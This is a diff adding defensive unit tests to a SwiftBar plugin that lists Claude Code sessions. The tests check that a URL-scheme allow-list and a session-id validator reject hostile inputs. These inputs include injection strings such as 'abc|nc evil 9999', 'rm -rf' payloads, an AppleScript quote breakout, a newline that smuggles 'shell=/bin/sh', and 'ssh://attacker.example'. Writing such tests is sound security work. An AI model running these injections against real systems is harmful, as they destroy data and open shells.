@@ -864,6 +864,37 @@ class TestConfigLoad(unittest.TestCase):
         config = plugin.Config._from_mapping({"context_window_tokens": "nope"})
         self.assertEqual(config.context_window_tokens, 1_000_000)
 
+    def test_editor_url_scheme_default(self):
+        self.assertEqual(plugin.Config().editor_url_scheme, "vscode://")
+
+    def test_editor_url_scheme_known_schemes_accepted(self):
+        # Every entry in the allow-list must round-trip through the loader.
+        # Add a real Code-OSS fork's scheme to ``_EDITOR_URL_SCHEME_ALLOWLIST``
+        # before extending this list.
+        for scheme in plugin._EDITOR_URL_SCHEME_ALLOWLIST:
+            config = plugin.Config._from_mapping({"editor_url_scheme": scheme})
+            self.assertEqual(config.editor_url_scheme, scheme)
+
+    def test_editor_url_scheme_rejects_unknown(self):
+        # Unknown schemes fall back to the default rather than being passed
+        # through to ``open``. A malicious config (e.g. written by another
+        # process under the same uid) otherwise turns every row click into
+        # a launcher for an arbitrary registered URL handler.
+        for hostile in (
+            "file:///",
+            "evil://",
+            "javascript:alert(1)",
+            "ssh://attacker.example",
+            "vscode",                # missing :// suffix
+            "VSCode://",             # case-sensitive
+            "",
+        ):
+            config = plugin.Config._from_mapping({"editor_url_scheme": hostile})
+            self.assertEqual(
+                config.editor_url_scheme, "vscode://",
+                f"hostile scheme {hostile!r} must fall back to default",
+            )
+
 
 # --------------------------------------------------------------------------- #
 # Menubar icon resolution                                                      #
@@ -966,6 +997,144 @@ class TestMenubarIconPieces(unittest.TestCase):
 # --------------------------------------------------------------------------- #
 # SwiftBar quoting                                                             #
 # --------------------------------------------------------------------------- #
+
+
+class TestIsValidSessionId(unittest.TestCase):
+    """Allow-list for session ids. The regex is a security boundary: every
+    downstream consumer (shell args, AppleScript dialogs, TSV field
+    lookups, SwiftBar ``paramN=`` tokens) assumes session ids contain no
+    metacharacters. New attack shapes belong here, not as defensive code
+    scattered across callers."""
+
+    def test_accepts_uuid_v4(self):
+        self.assertTrue(plugin._is_valid_session_id(
+            "abcd1234-ab12-4cd3-9ef0-abcdef012345"
+        ))
+
+    def test_accepts_short_test_fixture(self):
+        # The unit tests across this file use short SIDs like ``sid1``,
+        # ``fresh``, ``alive``. The regex must keep accepting them — they
+        # contain no metacharacters and the validator is about *shape*,
+        # not literal UUID-ness.
+        for sid in ("sid1", "fresh", "alive", "untracked", "AB_cd-12"):
+            self.assertTrue(
+                plugin._is_valid_session_id(sid),
+                f"safe fixture {sid!r} must pass",
+            )
+
+    def test_rejects_newline_injection(self):
+        # The original vector: a JSONL file named with a literal newline
+        # would let an attacker who controls ``~/.claude/projects/`` add
+        # a second SwiftBar menu row with arbitrary ``shell=`` / ``param``
+        # tokens. Reject before the value reaches the renderer.
+        self.assertFalse(plugin._is_valid_session_id(
+            "abc\nshell=/bin/sh param1=-c"
+        ))
+
+    def test_rejects_tab_injection(self):
+        # A SID with an embedded tab would shift the TSV columns and let
+        # attacker-controlled bytes land in the ``cwd`` / ``state_since``
+        # fields. Reject at parse time.
+        self.assertFalse(plugin._is_valid_session_id("abc\tworking"))
+
+    def test_rejects_applescript_quote_injection(self):
+        # The pre-patch ``delete-session.sh`` spliced ``$SID`` into an
+        # ``osascript -e "... ${SID} ..."`` template. A quote here used
+        # to break out of the AppleScript string literal.
+        self.assertFalse(plugin._is_valid_session_id(
+            'abc"; do shell script "rm -rf ~"; --'
+        ))
+
+    def test_rejects_shell_metacharacters(self):
+        for hostile in (
+            "abc;rm -rf /",
+            "abc&touch /tmp/pwn",
+            "abc|nc evil 9999",
+            "abc$(id)",
+            "abc`whoami`",
+            "abc>/etc/passwd",
+            "abc<file",
+            "abc*",
+            "abc?",
+            "abc /",
+        ):
+            self.assertFalse(
+                plugin._is_valid_session_id(hostile),
+                f"hostile SID {hostile!r} must be rejected",
+            )
+
+    def test_rejects_regex_metacharacters(self):
+        # The pre-patch ``grep -v "^${SID}\t"`` interpreted SID as a regex.
+        # ``.*`` would have matched every line and wiped the sidecar.
+        for hostile in (".*", "^.*$", "abc.def", "abc[ab]c", "abc(d)e"):
+            self.assertFalse(
+                plugin._is_valid_session_id(hostile),
+                f"hostile regex SID {hostile!r} must be rejected",
+            )
+
+    def test_rejects_empty(self):
+        self.assertFalse(plugin._is_valid_session_id(""))
+
+    def test_rejects_overlong(self):
+        # 64-char hard cap keeps log/menu/TSV lines bounded and prevents
+        # any attacker-controlled allocation pressure.
+        self.assertTrue(plugin._is_valid_session_id("a" * 64))
+        self.assertFalse(plugin._is_valid_session_id("a" * 65))
+
+
+class TestParseSidecarSecurity(unittest.TestCase):
+    """``_parse_sidecar`` must drop rows whose SID would weaponise a later
+    consumer (shell arg, AppleScript dialog, TSV column shift)."""
+
+    def test_drops_row_with_unsafe_sid(self):
+        # A real attacker can't usually get arbitrary bytes into the SID
+        # column — the hook writes whatever Claude Code gave it — but a
+        # corrupted TSV (half-written write, leftover from a previous
+        # schema, hostile process writing to the file) must not blow up
+        # the renderer either.
+        raw = (
+            'evil";do shell script "x";--\tworking\t1700000000\tPreToolUse\t/tmp\n'
+            "sid_ok\tworking\t1700000050\tPreToolUse\t/tmp\n"
+        )
+        result = plugin._parse_sidecar(raw)
+        self.assertEqual(set(result), {"sid_ok"})
+
+    def test_drops_row_with_regex_metacharacter_sid(self):
+        raw = (
+            ".*\tworking\t1700000000\tPreToolUse\t/tmp\n"
+            "sid_ok\tworking\t1700000050\tPreToolUse\t/tmp\n"
+        )
+        self.assertEqual(set(plugin._parse_sidecar(raw)), {"sid_ok"})
+
+
+class TestLiveSessionIdsSecurity(unittest.TestCase):
+    """``_live_session_ids`` reads filenames under ``PROJECTS_DIR``. Any
+    process running under the same uid can write there, so the listing
+    itself is untrusted input. The validator is what makes the rest of
+    the renderer safe to use the result without quoting."""
+
+    def setUp(self):
+        import tempfile
+        self._tmpdir = Path(tempfile.mkdtemp())
+        self._original = plugin.PROJECTS_DIR
+        plugin.PROJECTS_DIR = self._tmpdir
+
+    def tearDown(self):
+        import shutil
+        plugin.PROJECTS_DIR = self._original
+        shutil.rmtree(self._tmpdir, ignore_errors=True)
+
+    def test_skips_unsafe_filenames(self):
+        project = self._tmpdir / "-fake-proj"
+        project.mkdir()
+        # Filenames an attacker with write access to ~/.claude/projects/
+        # could plausibly create: shell-quote injection and a regex-anchor
+        # SID. The validator rejects both; the safe one survives.
+        (project / 'evil";do shell script "x";--.jsonl').write_bytes(b"")
+        (project / ".*.jsonl").write_bytes(b"")
+        (project / "abcd1234-ab12-4cd3-9ef0-abcdef012345.jsonl").write_bytes(b"")
+        live = plugin._live_session_ids()
+        self.assertEqual(live, {"abcd1234-ab12-4cd3-9ef0-abcdef012345"})
 
 
 class TestSwiftbarQuote(unittest.TestCase):
